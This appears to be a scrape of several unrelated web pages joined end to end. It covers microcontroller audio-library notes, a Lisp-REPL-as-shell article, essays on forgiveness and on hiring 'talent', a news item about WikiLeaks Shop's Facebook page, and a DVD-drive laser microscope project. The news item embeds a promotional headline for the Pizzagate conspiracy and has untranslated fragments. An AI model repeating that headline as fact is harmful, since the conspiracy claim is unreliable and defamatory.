  <li>Output is 12 bits in STANDARD and STANDARD_PLUS modes, up from nearly 9 bits for Atmel based boards. HIFI audio, which works by summing two output pins, is not available on Teensy 3.0/3.1/3.2.</li>
  <li><code>#include &lt;ADC.h&gt;</code> is required at the top of every Teensy 3 sketch.</li>
  <li>The examples come with this commented out, for Arduino compatibility.</li>
  <li>Serial baud rate for monitoring in the IDE needs to be set to 9600 to work with Teensy 3.0/3.1/3.2. This slow rate can cause audio glitches.</li>
  <li>twi_nonblock code by Marije Baalman for non-blocking I2C is not compatible with Teensy 3.0/3.1/3.2.</li>
</ul>

<h3 id="esp8266">ESP8266</h3>
<p>port by Thomas Friedrichsmeier</p>

<ul>
  <li>Since flash memory is not built into the ESP8266, but connected, externally, it is much too slow for keeping wave tables, audio samples, etc. Instead, these are kept in RAM on this platform.</li>
  <li>Asynchronous analog reads are not implemented. <code>mozziAnalogRead()</code> relays to <code>analogRead()</code>.</li>
  <li>AUDIO_INPUT is not implemented.</li>
  <li>twi_nonblock is not ported</li>
  <li>Several audio output modes exist, the default being PDM_VIA_SERIAL (configurable in AudioConfigESP.h):
    <ul>
      <li>PDM_VIA_SERIAL: Output is coded using pulse density modulation, and sent via GPIO2 (Serial1 TX).
        <ul>
          <li>This output mode uses timer1 for queuing audio sample, so that timer is not available for other uses.</li>
          <li>Note that this mode has slightly lower effective analog output range than PDM_VIA_I2S, due to start/stop bits being added to the output stream.</li>
        </ul>
      </li>
      <li>PDM_VIA_I2S: Output is coded using pulse density modulation, and sent via the I2S pins. The I2S data out pin (which is also “RX”) will have the output, but <em>all</em> I2S output pins (RX, GPIO2 and GPIO15) will be
affected. Mozzi tries to set GPIO2 and GPIO15 to input mode, and <em>at the time of this writing</em>, this allows I2S output on RX even on boards such as the ESP01 (where GPIO15 is tied to Gnd). However, it seems safest to
assume that this mode may not be useable on boards where GPIO2 or GPIO15 are not available as output pins.</li>
      <li>EXTERNAL_DAC_VIA_I2S: Output is sent to an external DAC (such as a PT8211), digitally coded. This is the only mode that supports STEREO_HACK. It also need the least processing power.
        <ul>
          <li>TODO: Untested!</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>There is no “HIFI_MODE” in addition to the above output options. For high quality output, either use an external DAC, or increase the PDM_RESOLUTION value.</li>
  <li>Note that the ESP8266 pins can output less current than the other supported CPUs. The maximum is 12mA, with a recommendation to stay below 6mA.
    <ul>
      <li>WHEN CONNECTING A HEADPHONE, DIRECTLY, USE APPROPRIATE CURRENT LIMITING RESISTORS (&gt;= 500Ohms).</li>
    </ul>
  </li>
  <li><em>Any</em> WiFi-activity can cause severe spikes in power consumption. This can cause audible “ticking” artifacts, long before any other symptoms.
    <ul>
      <li>If you do not require WiFi in your sketch, you should turn it off, <em>explicitly</em>, using <code>WiFi.mode(WIFI_OFF)</code>.</li>
      <li>A juicy enough, well regulated power supply, and a stabilizing capacitor between VCC and Gnd can help a lot.</li>
      <li>As the (PDM) output signal is digital, a single transistor can be used to amplify it to an independent voltage level.</li>
    </ul>
  </li>
  <li>The audio output resolution is always 16 bits on this platform, <em>internally</em>. Thus, in updateAudio(), you should scale your output samples to a full 16 bit range. The effective number of output bits cannot easily be quantified, due to PDM coding.</li>
  <li>audioHook() calls <code>yield()</code> once for every audio …</li></ul></div></div></div>

The concepts I’m going to present in this article were featured in a
<a href="https://fosdem.org/2021/schedule/event/lisprepl/">presentation at FOSDEM 2021</a>.  The video demonstrates a rather unconventional
paradigm how to think the REPL as a “shell” interface to the machine.
</p>

<p>
In this article I’m going to dive into more in details in the theory, the setup,
as well as more advanced features.
</p>

<p>
Mind the title: this is <i>not</i> about another system shell implemented in Lisp
(such as <a href="https://clisp.sourceforge.io/clash.html">clash</a> or <a href="https://github.com/SquircleSpace/shcl">shcl</a>); rather, I tried to approach the problem in the opposite
direction by trying to bring the “shell” to a programming language <a href="https://en.wikipedia.org/wiki/REPL">REPL</a>.
</p>

<blockquote>
<p>
I want to emphasize that while I use <a href="https://common-lisp.net/">Common Lisp</a> and <a href="https://www.gnu.org/software/emacs/">Emacs</a> as support technology
for my demos, the thesis of this article concerns itself with a different shell
interface paradigm.
</p>

<p>
Should you dislike Emacs or Lisp, never mind: the concept presented here can be
adapted using other (editor) interfaces and other programming languages (but not
all, as I will explain later).

This article is bordering the format of an extensive tutorial and as such it’s
rather long.  The various top sections starting from <a href="#org0c35e0b">SLY: A tour of a most-advanced REPL</a> are mostly independent so feel free to read them in any
order.  (I’ve interlinked them whenever necessary.)

<div id="outline-container-org67d6be0">
<h3 id="org67d6be0">The universal computer usage paradigm, and why traditional shells are poor tools</h3>
<div id="text-org67d6be0">
<p>
What a computer user (and in particular a technically minded user such as a
developer) does on a computer can be understood as one of three actions:
</p>

<ul>
<li>Data collection and filtering.</li>
<li>Data visualization (which I also call “inspection” in this article).</li>
<li>Data transformation (which I also call “processing” in this article).</li>
</ul>

<p>
Opening a file or multiple files with a program, say, to play a music album, is
in effect “collection + visualization”.  Shrinking a bunch of photos is
“collection + processing”.
</p>

<p>
I believe that most, if not all our interactions with a computer can be summed
up in those three tasks.
</p>

<p>
More interestingly, there is a feedback loop between collection and
visualization, which is very common when manipulating large bunches of files
from a shell: the user first displays the file list to process, then filters it,
displays the filtered list, re-filters if needed, re-displays it, and so on.
When the file list is finalized, the user can process it and finally visualizes
the result.
</p>

<p>
This feedback loop that’s best represented by this simple diagram:
</p>


<figure>
<img src="https://ambrevar.xyz/lisp-repl-shell/feedback-loop.png" alt="feedback-loop.png">

<figcaption><span>Figure 1: </span>User interaction feedback loop</figcaption>
</figure>

<p>
It turns out that traditional shells are particularly poor interactive tools
to deal with such a feedback loop.
</p>

<p>
To paraphrase the example in <a href="http://howardism.org/Technical/Emacs/piper-presentation-transcript.html">Howard’s presentation on piper</a>, typical
“collection + processing” in the shell happens with a pipeline and some control
structures:
</p>

<div>
<pre>for S in $(systemctl --all | grep openstack | sed 's/\.service.*//' | cut -c3-)
do
    systemctl restart $S
done
</pre>
</div>

<p>
In the above example, as is customary in the shell, the whole “collection +
processing” step remains a blackbox to the user who can visualize the data only
before and after, but never for the intermediate steps.
</p>

<p>
While we are at it, shell languages from the <code>sh</code> family have poor control
structures, which make simple things like a <code>for</code> loop too cumbersome to write
and riddled with <a href="https://mywiki.wooledge.org/BashPitfalls">pitfalls</a>.
</p>

<div id="outline-container-org331bb05">
<h3 id="org331bb05">The local minimal of terminals and shells</h3>
<div id="text-org331bb05">
<p>
There is a common misconception that terminals and shells are inherently bound
to each other, to the point that there is sometimes a confusion between the
two.
</p>

<ul>
<li><p>
A terminal, actually a terminal emulator, is a program that <i>visually</i>
emulates the hardware of the 1970s and 1980s, such as the <a href="https://en.wikipedia.org/wiki/VT100">VT100</a>.  These tools
are by definition stuck in the past.
</p>

<p>
(A common misconception is that they are fast.  Ironically, they are not:
emulators emulate the physical properties of the terminal such as the baud
rate, and this limits the speed at which text can be printed.)
</p></li>

<li>A shell is a programming language interpreter.  A <a href="https://en.wikipedia.org/wiki/REPL">REPL</a> of a sort.
It often embeds interactive features such as a prompt with history support.</li>
</ul>

<p>
Terminals have no reason to continue to be used in my opinion.  Note that this
does not mean we shouldn’t use “textual” interfaces, quite the opposite: textual
data is a bliss to manipulate.  But we can very well manipulate text, along with
other types of data, in something other than a terminal, that is faster,
prettier, more powerful.  (Graphical Emacs is one such example.)
</p>

<p>
In the past I’ve discussed the drawbacks of using a terminal as an interface
(see my article <a href="https://ambrevar.xyz/emacs-eshell/index.html">Eshell as a main shell</a>).  I won’t go into the details again, but
allow me to summarize terminal-induced limitations of traditional shells:
</p>

<ul>
<li>Can’t search the outputs.</li>
<li>Can’t interact with output (like opening a path under the cursor).</li>
<li>Can’t copy/paste without a mouse (barring a few hacks).</li>
<li>Can’t navigate the prompts.</li>
<li>Limited colors (barring a few hacks), formatting and rendering is convoluted and
not portable.</li>
<li>Can’t render anything beside text.</li>
<li>Interface toolkits like ncurses can’t render <i>structured</i> widgets (to see what
I mean, try selecting text in an ncurses frame: the selection will grab the
whole line, beyond the frame).</li>
<li>Slow text output.</li>
<li>Poor font support (single size).</li>
<li>No per-pixel elements (e.g. cannot draw a line separator).</li>
<li>Prompts and their output cannot be folded, moved arround, etc.</li>
</ul>
</div>
</div>

<div id="outline-container-org0cf138f">
<h3 id="org0cf138f">Readline-shells, “go-to scripts” and code composition</h3>
<div id="text-org0cf138f">
<p>
I was an <a href="https://ambrevar.xyz/emacs-eshell/index.html">Eshell</a> user for a while, then I switched to <a href="https://ambrevar.xyz/emacs-eshell-versus-shell/index.html">M-x shell</a>.  Both these
non-terminal-based shells rid me of most of the aforementioned terminal
limitations, since graphical Emacs is a full-blown graphical application.
</p>

<p>
But I still wasn’t satisfied, in particular with the programming language used
by the shell (I’ve used <a href="https://www.gnu.org/software/bash/">Bash</a>, <a href="https://www.zsh.org/">Zsh</a>, <a href="https://fishshell.com/">Fish</a> and Eshell).
</p>

<p>
I fancy the Lisp programming languages, so why not use the language I’m most
comfortable with, say Common Lisp?
</p>

<p>
For a long time I tried really hard to stick to the paradigm of what I call the
“readline shells”.  Almost all shells are developed with the idea of running in
a terminal with a <a href="https://savannah.gnu.org/projects/readline/">readline</a>-based prompt (if not <code>readline</code>, then a similar
interface).  Even shells as exotic as <a href="https://xon.sh/">Xonsh</a>, <a href="https://ammonite.io/#Ammonite-Shell">Ammonite Shell</a>, <a href="https://www.oilshell.org/">Oil shell</a> or <a href="https://github.com/SquircleSpace/shcl">SHCL</a>
are developed with this paradigm in mind.
</p>

<p>
This can only perpetuate the problem: these shells can’t really escape the poor
feedback loop problem I mentioned above because of the lack of interactivity
options in the user interface.  And it is still limited in terms of rendering,
prompt navigation and manipulation, etc.

<div id="outline-container-org7141780">
<h4 id="org7141780">“Go-to scripting languages”</h4>
<div id="text-org7141780">
<p>
Power users and developers alike <a href="https://old.reddit.com/r/emacs/comments/csvje9/lisp_people_whats_your_goto_language_for_when_you/">fancy having their personal “shell scripts”</a>,
usually short and simple programs that don’t warrant an official distribution,
to perform every day tasks from file processing to shell helpers.
</p>

<p>
These programs can be written in various languages, but unfortunately the choice
must be restricted for practical reasons:
</p>

<ul>
<li>Some languages are “compile-only”, so they won’t take scripts.</li>
<li>Some language interpreters are too slow to start (e.g. above 100ms), which
makes the script prohibitive to use in a tight loop from another script.</li>
<li>Some languages are poor at process management.</li>
<li>Portability may be a concern: if a script requires libraries to be
locally installed, it may hinder its use on another system, like your other
machine or a friend’s computer.</li>
</ul>

<p>
<code>Bash</code>, <code>POSIX sh</code> and friends address all these points rather well, which
probably explains why they are so ubiquitous (especially the point on
portability).
</p>

<p>
But is it enough a reason to surrender and keep using among the worst
programming languages out there today?
</p>

<p>
I believe it’s high time we challenged the status quo and stepped up in the
shell game.
</p>

<p>
As we will see in the rest of the this article, a required feature for a programming
language to be used as a shell is meta-programmability, or the ability to
redefine at least part of its syntax.  Here Lisp languages perform really well thanks
to their <a href="https://en.wikipedia.org/wiki/Homoiconicity">homoiconicity</a> property.
</p>

<p>
Perl or Python are often quoted as good alternatives: It’s certainly more expressive and
less limited than Bash while enjoying a broad ecosystem of libraries.
</p>

<p>
Being a Lisper at heart, I’ve explored the surface of various options:
</p>
</div>

<ul>
<li><a id="org10b012d"></a><a href="https://github.com/scheme/scsh">scsh</a>
<p>
<a href="https://github.com/scheme/scsh">scsh</a> is an obvious choice since its name stands for the “Scheme shell”.  While a
Scheme, it seems that it is does not have a broad ecosystem of libraries, which
may make it a bit limiting in practice, or forcing the users to write most of
their own.  (Please correct me if I’m wrong.)
</p>
</li>

<li><a id="orgd20fe1c"></a>Guile
<p>
<a href="https://www.gnu.org/software/guile/">Guile</a> is a good contender: it’s reasonably fast, it has a developing ecosystem,
it has good support for scripting.
</p>
</li>

<li><a id="org485d608"></a>Gauche
<p>
<a href="https://practical-scheme.net/gauche/index.html">Gauche</a> design goal is to be a fast scripting language.  So it could be ideal for
go-to scripts.
</p>
</li>

<li><a id="org9b49919"></a>TXR
<p>
I am mostly ignorant about <a href="https://nongnu.org/txr/">TXR</a>, so I can only tell from the little I’ve played
with it: it seemed rather slow (maybe in the ballpark of Bash), and I’m unsure
about its ecosystem.
</p>
</li>

<li><a id="orgd989470"></a>Racket
<p>
At first, Racket startup time around 100ms on my machine seems prohibitive for
scripts.  But maybe there is a way to overcome this.  Any Racketeer around? :)
</p>
</li>

<li><a id="orge3f2b5c"></a>Emacs Lisp<br>
<div id="text-orge3f2b5c">
<p>
<a href="http://howardism.org/Technical/Emacs/piper-presentation-transcript.html">Howard’s piper</a> is very inspiring, but I decided not to go with Elisp which I
believe is too limiting (for now) to be used as a shell language.
</p>

<p>
Eshell cannot separate standard input from standard error.  This is a blocker in
my opinion, until we fix it or implement some other shell in Emacs Lisp.
</p>

<p>
As a scripting language, Emacs Lisp is not a great choice either because <code>emacs
--script</code> can only print to <code>stderr</code>.
</p>

<p>
Besides, as of Emacs 27, Emacs Lisp has poor threading support.  This is quickly
limiting, in particular when it comes to …</p></div></li></ul></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Forgiveness is one of the most, if not the most, essential virtue for any civilized society. And yet it seems to be one of the virtues most lacking in America today. Politicians who are disloyal to the party line are censured, despite being faithful to political principle and their conscience. Professionals who years earlier used an inappropriate slur are fired, despite sincere apologies. Public figures whose image is once tarnished by inappropriate behavior are consigned to permanent pariah status, despite their contrition. It seems that once you are out of society’s good graces nowadays, you have little hope of return.</p>



<p>This is a worrying trend because forgiveness is critical to maintaining the integrity of society by providing a way to reintegrate society’s lost sheep. Without the possibility of personal contrition and social rituals of repentance leading to a welcoming of these lost sheep back into the social fold, there is no possibility for social learning and improvement, only perfection or social exile.&nbsp;</p>



<p>Everyone makes mistakes. In the pre-internet era, an inopportune remark during the foolishness of teenagehood might have faded with the years as those hurt moved on and those guilty changed their ways. Now, a tonedeaf post on Twitter becomes part of a person’s permanent social record and decades later could lead to the loss of livelihood or opportunity, despite the individual having since renounced their youthful indiscretions.</p>



<p>Because of a lack of forgiveness, people are not allowed to mature, they are not allowed to change. Who you are today is judged by who you were at your worst moment instead of who you have grown to become. This has created social anxiety and fear in the youth of today, and many of the not-so-young as well.</p>



<p>Jesus’ disciple, Peter, once asked Jesus, “Lord, how oft shall my brother sin against me, and I forgive him? till seven times? Jesus saith unto him, I say not unto thee, Until seven times: but, Until seventy times seven” (Matthew 18:21-22, KJV). </p>



<p>The Jews of Peter and Jesus’ time had strict codes of behavior, according to the Law of Moses. Yet they also had well-established means of repentance and forgiveness for those who violated the Law. Here, Jesus reaffirmed the great importance of forgiveness.&nbsp;</p>



<p>While the America of today has fewer rules than the Jews under the Law of Moses, we have lost any meaningful mechanism for offenders of our social codes to repent and be reintegrated into respectable society.&nbsp;</p>



<p>If processes of receiving forgiveness are not rediscovered in America, the group of social pariahs will only grow and contribute to the sense of hopelessness that leads to the social and political extremism already evident in our country today. After all, if you are an outcast or “deplorable,” what do you have to lose from tearing down the system that excludes you?</p>



<p>But forgiveness is about so much more than being brought back into society’s good graces for big, public mistakes. It is just as much about how we treat each other in our daily interactions. How do we treat the person who cut us off in traffic? How do we react to the person who failed to use our preferred pronoun? How do we respond when someone demonstrates ignorance of our own suffering or that of another?</p>



<p>The millions of daily acts of forgiveness or condemnation of the perpetrators of social misdemeanors weave the tapestry of social cohesion. If condemnation prevails, the social grace that makes up the very fiber of civilization unwinds.&nbsp;</p>



<p>Forgiveness does not require acceptance of bad behavior, quite the contrary. Forgiveness is a recognition that behavior is, in fact, bad, but also has the insight to see that everyone is imperfect and should be afforded the chance to try to do better next time. As such, forgiveness is the ultimate expression of love.</p>



<p>A great irony is that those who fail to forgive, at a personal level, often suffer much more than those in need of forgiveness. How often has a long-held grudge consumed its patron until the consequences are manifold greater than the original offense? This is perhaps most true when, at the personal level, we fail to forgive those who are <em>not</em> penitent.</p>



<p>Even those guilty of criminal behavior need the forgiveness of both society and the individuals harmed by the crime. This does not mean that criminals should not serve their time, simply that, for the good of society and the victims of crime, forgiveness needs to be granted for psycho-social resolution and progress.</p>



<p>Ultimately, forgiveness is the great arbiter, the reconciliator. It is forgiveness that allows society to be both just and merciful. It allows institutions to be created and people to be held accountable to those institutions, while also setting forth means for those who violate the rules to regain social acceptance. Without forgiveness, America will continue to devolve into Thomas Hobbes’ dystopian vision of the pre-civilized, natural state of life for man as, “solitary, poor, nasty, brutish, and short.”</p>

February 7, 2021 | https://blog.nukemberg.com/post/talent-is-largely-a-myth/ | <a href="https://web.archive.org/web/*/https://blog.nukemberg.com/post/talent-is-largely-a-myth/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main"><div><div><article role="main"><p>One of the repeating motifs of recruiting in the software industry are mantras of “talent”: “We recruit the best talent”, “talent attracts talent”, “we value talent” and so on. Some companies have so called “head of talent”, “talent acquisition”, “talent development” professionals on their payroll - basically a re-branding of HR. With the amount of conversations, conference talks and hype going on around talent, you would expect people will have an answer to the question “what is talent?”. You’d expect, and you’d be wrong: “it’s like porn, you know it when you see it” is the answer I usually get - and as with porn, this only conveys that the word is merely an unhelpful judgemental label. If you cannot give <em>some</em> attributes of “talent”, how are you going to find it, develop it, keep it? Also, it’s not as if the subject of talent hasn’t been researched - quite the contrary! Although research is far from being exhaustive of the subject (or anything related to intelligence for that matter), there is plenty we do know. As it turns out, most of what we hear about “talent” in the software industry is just plain wrong and based on naive and deprecated models if not outright self delusions. For example, <a href="https://www.joelonsoftware.com/2005/01/27/news-58/">Joel Spolsky has observed years ago</a> that almost all companies are somehow convinced they hire only the top 1% of developers - a clear case of selection bias. When people tell me they want to hire the top 1% of developers, I laugh. First because as Joel Spolsky noted everyone says that. Second, it implies we have some measurement of developers abilities - if we had that, why are we working so hard on interviews? Third, do they mean “top 1% of the population” of developers or the developers with top 1% of the skill scale? they are not the same. Fourth, it assumes that skill is static and when they hire a top 1% developer she will remain a top 1% developer - in other words that performance is dependent only on the identity of the developer.</p><p>All of these assumptions are completely wrong.</p><h2 id="talent-is-multi-dimensional">Talent is multi dimensional</h2><p>Suppose for a second we have some kind of metric by which we can sort developers on a scale to choose the best 1% of them. If such a metric exists, design a test for it and stop doing interviews! The reason why we have interviews, test projects and hiring committees is that there is no metric or even a group of metrics which can be measured and by which we can evaluate developers. In sports a large surrounding industry of gambling and statistics popped up because while the game itself has a clear score the relative strength and weaknesses of players and teams are far from being easily measurable - and it isn’t even clear which attributes impact the game and should be measured. Likewise, software engineering involves many different skills and let’s be honest here, we don’t really know what skills contribute to success and which of them are necessary or sufficient. But unlike sport matches, in software engineering we don’t know how to score relative performance of engineers - we have no measurement of goodness for code nor are we likely to ever have one. There are many different dimensions to goodness of code, and their relative important can change between projects or time. Even performance which is the most measurable of these is contextually defined, for one project performance means throughput while for another it’s the 99th percentile of latency.</p><h2 id="talent-isnt-static">Talent isn’t static</h2><blockquote><p>A genius is not born but is educated and trained….When a child is born healthy, it is a potential genius.</p></blockquote>Everyone wants to hire talent, but few people are asking “where does talent come from?”. There are a lot of evidence that “ingrained talent” is largely a myth. The more we learn about the brain the more we understand the answer to the nature vs nurture question is always “both”. On the one hand, we have Mozart: a brilliant musician from childhood; on the other side of the spectrum we have the Polgar sisters - geniuses by design. But Mozart was born to a musician father and grew up immersed in music, nurtured from an early age and no one can tell how he would have developed in another family. Conversely, how many potential Mozarts have we missed due to lack of nurture? no one knows.<p>None of us started proficient in programming, nor were we born with the ability to speak or think - we <em>developed</em> these abilities. If there’s one thing we know for sure about intelligence, it’s that it is adaptive - in fact, the general definition of intelligence is “adapting to provide better results predictably better than random”. The “better than random” part is important, because there’s nothing intelligent in winning 50% of coin tosses (or making profit in a rising market). The “adaptive” part is of particular interest though, as all strategies are specialized to some degree; being good at something doesn’t mean you’ll be good at something else, a fact worth remembering when hiring fresh graduates based on their University score - being good at University tests is not a transferrable skill to developing software. Intelligence is adaptation, and while it’s true that some individuals adapt faster than others it should be clear the reasons for that are mixture of innate abilities and environmental factors. All standard tests are remarkably bad at measuring this because they are focused on measuring specific skills and not adaptation. Personally I believe the best predictor of a person’s adaptive abilities are what we call “personality traits” - things like curiosity, openness and critical thinking (it turns out this belief has grounding in research). Anyway, if we accept that intelligence is adaptive it should be clear any measurement of current skill is less interesting than the adaptive potential of the individual. “Talent” is a network effect and exhibits all the familiar behaviors of network effects. It shouldn’t be surprising to learn that people <a href="https://blog.atomist.com/the-origins-of-opera-and-the-future-of-programming/">better develop their talent in groups</a>. The <a href="https://www.amazon.com/Where-Good-Ideas-Come-Innovation/dp/1594485380">history of innovation</a> demonstrates that innovation isn’t driven by heroic geniuses but by intricate collaborative networks - although popular media would have you believe otherwise. Indeed, people augment each other not only in skill but in adaptation and learning as well.</p><blockquote><p>“we don’t have these Netflix superstar engineers to do the things you’re talking about”, and when I looked around the room at the company names my response was “we hired them from you and got out of their way”</p></blockquote><p>How often was someone who was thought to be talented in his previous company hired only to have them perform poorly in the new one? How many times have you seen “diamonds in the rough” who displayed no talent in one workplace but suddenly became a rising star after moving to a new one? The prevalence of these occurrences should be enough to convince you that talent development is highly linked to the environment. Understanding this, we shouldn’t say that “A graders hire other A graders, B graders hire C graders” but rather that “A graders create A graders, B graders create C graders”. You’ve witnessed this yourself for sure - the loss or rise of motivation, the challenges, mentoring or put downs by teammates can make a star a disgruntled moron or spark flames of wisdom and enthusiasm in a once mediocre person. <strong>You hire potential talent, but manifestation of talent is developed</strong>.</p><h2 id="talent-isnt-linear">Talent isn’t linear</h2><p>The entire world has an estimated 25-30 million developers, and Google reportedly employees over 100,000 of them. Even if we think this number is exaggerated, Google, Amazon, Facebook, Microsoft and the rest of Silicon Valley giants employ hundreds of thousands of developers - well over the 1% mark. It’s obvious they can’t hire “the top 1%” simply because they are too big, but perhaps a small startup can?

For natural skills or attributes the distributions tend to be normal or log-normal, but is this the case for <em>results</em> of applying these skills? We have argued before that talent is a network effect and for network effects power distributions reign, e.g. the Zipfian distribution of city sizes. Skill isn’t uniformly distributed - which means there’s a big difference between hiring the top %1 of the <em>population</em> and hiring the people with the top 1% of results and that difference is extremely large when power laws are involved. That’s the Pareto principle in a nutshell, 80% of results come from 20% of the effort. The developers producing the top 1% of results, for whatever measurement of results you choose, are a tiny fraction of the population. You are unlikely to ever meet one. So let’s assume people mean the top 1% of the population. Here’s what the compensation distribution chart looks like:<div><figure itemprop="associatedMedia" itemscope="" itemtype="http://schema.org/ImageObject"><p><img itemprop="thumbnail" src="https://blog.nukemberg.com/img/compensation-distribution.png" alt="/img/compensation-distribution.png"></p><a href="https://blog.nukemberg.com/img/compensation-distribution.png" itemprop="contentUrl"></a></figure></div>This specific data is self reported from the San Francisco area and the tail goes well beyond the million $ mark. All compensation and wealth distributions have similar shapes, the top 1% of any free profession don’t make 50% or even 100% more than the mean, they make hundreds of percents more<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. In other words, there is no way for a startup to pay a top 1% developer (but perhaps they can offer some other incentive, and I don’t mean stock options because that’s crap).<p>If all of these prevalent assumptions about talent are wrong, what does it say about our hiring and management practices? what do managers even mean when they set out to hire “good developers” given that their goodness cannot be measured and is highly volatile? And if talent is as László Polgár claimed not born but rather developed, what is the value of testing for <em>present</em> level of proficiency. Is it possible that <em>where we hire to</em> is more important than <em>who</em> we hire? It’s clear we need a better model of talent, one which focuses on the conditions suitable for development and nurture of talent rather than attracting talent. I have some hunches about what this model would look like, and there are definitely tell-tale examples out there to learn from. But this kind of new model …</p></article></div></div></div></div>

<p><strong>-The elimination of the WikiLeaks Shop on Facebook is strongly criticized for being considered “one more censorship action of social networks”</strong><br>
<strong>-WikiLeaks Shop sells t-shirts, hoodies and mugs with the organization’s logo, which carry messages such as: “Exposing crimes is not a crime”</strong><br>
<strong>-The site now offers discounted merchandise if buyers use the code “NOCENSORSHIP”</strong></p>
<p>The removal of the WikiLeaks Shop Facebook page is the latest example of high-profile organizations experiencing what critics argue: it’s the increasingly censorious nature of social media.</p>








<p>It has not been posted on the WikiLeaks Shop Facebook page for allegedly violating the “community standards” of the social networking site.  On February 2, 2021, the Facebook page belonging to the marketing arm of the transparency and news outlet was blocked from public view with a statement that read: “Your page, WikiLeaks Store, has not been published.” .</p>
<p>This would later be explained with a message that simply stated, “This is because WikiLeaks Shop is against our community guidelines.”  The Facebook page has existed since December 3, 2011.</p>
<p>WikiLeaks Shop sells T-shirts, hoodies and mugs with the organization’s logo, which carry messages such as: “Exposing crimes is not a crime”, “Free Julian Assange” and “1984 is not an instruction manual”, in reference to the dystopian novel about life in a totalitarian state written by George Orwell.</p>

<p>Related Notes: #Pizzagate: Pedophile Cult Now Trending Thanks to Justin Bieber Promotion </p>
<p>“I spoke with a person [a través del soporte empresarial de Facebook] and they told me that they couldn’t help me and that the appeal process was the only way ”, explains the person who runs the WikiLeaks store to the Russian media Sputnik.</p>
<p>The source added to the outlet that there was an appeal process but that it was fully automated.  “The appeal did not allow [ninguna opción para publicar] nothing, it was more of a ‘if you don’t agree with this decision, please click this button’ ”.  Possible attack by bots for supporting WikiLeaks founder</p>
<p>However, the WikiLeaks Shop manager “discovered something interesting,” he told Sputnik.  They realized that the decision to unpublish the Facebook page followed what appears to be an attack by apparent bots (automated accounts).  “Someone probably made it look like we were paying someone to share our posts with the bots,” the source explained.</p>
<p>The final post made by WikiLeaks Shop, before their page was taken down, simply contained a graphic with a black t-shirt and the words “Free Assange” on it.</p>

<p>“I don’t think that’s the content that would violate their policies,” explained the source.  “I read their policies, we do not participate in anything against them as far as I know,” they added.  The site now offers discounted merchandise if shoppers use the code “NOCENSORSHIP” through the website.</p>
<p>The management of the page contacted the Facebook press department to obtain a right of reply on the removal of their site from networks.  A member of Facebook’s press team responded asking for more information and a link to the unpublished page, explaining that they could not comment until they investigated further on the matter.</p>
<p>Julian Assange, co-founder of WikiLeaks, remains in Belmarsh prison while the US government appeals the decision of District Judge Vanessa Baraitser on the refusal to grant extradition.</p>

<div>

<p>
<a href="https://loetlabor-jena.de/lib/exe/detail.php?id=projekte%3Advdlsm%3Astart&amp;media=projekte:dvdlsm:dvdlsm_full.jpg" title="projekte:dvdlsm:dvdlsm_full.jpg"><img src="https://loetlabor-jena.de/lib/exe/fetch.php?w=450&amp;tok=16dc0d&amp;media=projekte:dvdlsm:dvdlsm_full.jpg" alt="" width="450"></a>
</p>

<p>
Due to an abundance of one specific type of DVD drives, plans were made to give a useful afterlife to these devices. A laser scanning microscope seemed to be the most useful project.
</p>

</div>

<h2 id="preface">Preface</h2>
<div>

<p>
This project was inspired by the work done by Hannes Zöllner towards his Ph.D., during which he evaluated commercial DVD drives for fault injection in semiconductor devices. At some point, his system was also repurposed for imaging, with surprisingly remarkable results. An effort was made to optimize the system used in this project for imaging rather than for fault injection.
</p>

<p>
A DVD drive is a remarkable device, being able to discern the height of tiny pits of about 440 nm in length, laid out in tracks separated by only 780 nm. Of course, Blu-Ray technology decreased both these numbers further, but DVD drives tend to be thrown away in large quantities these days, which makes them available to the hobbyist basically free of charge.
</p>

</div>

<h2 id="concept">Concept</h2>
<div>

<p>
The OPU (Optical Pickup Unit) of a DVD drive normally contains all the optical and most of the electrical components required to read data from a disk. Normally, it includes laser diodes (and sometimes their driver electronics), a multi-quadrant detector diode (PDIC or OPIC), the required optical elements (lenses, mirrors, prisms, gratings) and the actors for focus, tilt and tracking control (typically electromagnetic actuators moving the primary lens close to the disk). Normally, the OPU is mounted on a linear rail equipped with a stepper motor for one-axis position control.
</p>

<p>
In the available drives, all OPU components are interfaced using a single FFC (flat cable) to a custom board that houses a proprietary microprocessor and various components not quite available to the average consumer. Therefore a replacement for these electronics that utilizes commercially available components open source hardware/software should be created.
</p>

<p>
This replacement should provide the following basic functionalities:
</p>
<ul>
<li><p> Interface to PC for data acquisition</p>
</li>
<li><p> Driving of OPU actuators (lens coils)</p>
</li>
<li><p> Driving of laser diode(s)</p>
</li>
<li><p> Readout of the PDIC for focusing and image acquisition</p>
</li>
</ul>

</div>

<h2 id="opu_architecture">OPU Architecture</h2>
<div>

<p>
The OPU in the available drives is a tightly integrated component, mostly consisting of a single cast-aluminum block, in which various optical components are glued. A top-down-view of the OPU after removing the cover can be seen below.
</p>

<p>
<a href="https://loetlabor-jena.de/lib/exe/detail.php?id=projekte%3Advdlsm%3Astart&amp;media=projekte:dvdlsm:opu_disassembled.jpg" title="projekte:dvdlsm:opu_disassembled.jpg"><img src="https://loetlabor-jena.de/lib/exe/fetch.php?w=500&amp;tok=364a3d&amp;media=projekte:dvdlsm:opu_disassembled.jpg" alt="" width="500"></a>
</p>

</div>

<h3 id="laser_diodes_lens_and_actuators">Laser Diodes, Lens and Actuators</h3>
<div>

<p>
The OPU houses two laser diodes. As this is just a DVD/CD reader, the lasers are not very powerful but provide sufficient power for microscopy applications. The (red) DVD diode starts laser operation above approx. 60 mA and requires about 2-2.5 V of forward voltage. Its polarity can be easily determined by measurements.
</p>

<p>
The primary lens is positioned using electromagnetic actuators. These come in the form of three coils, which tilt or move the coil proportionally to the current flowing though them. Their polarity and required full-scale DC actuation current can be easily found by using a lab power supply.
</p>

<p>
The focusing control loop driving these coils is normally deriving its error signal from the astigmatic focus error detection method. It requires (in its basic form) a four-quadrant diode, and focus is optimized when all quadrants of the diode are equally illuminated. Deviation from this point will cause the circular illumiation to become elliptical and therefore illuminate two diagonal quadrants more strongly. A schematic explanation of that scheme can be found <a href="https://www.researchgate.net/figure/Astigmatic-detection-method-a-Schematic-diagram-of-the-optical-system-with-commercial_fig1_329138728" title="https://www.researchgate.net/figure/Astigmatic-detection-method-a-Schematic-diagram-of-the-optical-system-with-commercial_fig1_329138728" rel="ugc nofollow">here</a> and in many textbooks.
</p>

</div>

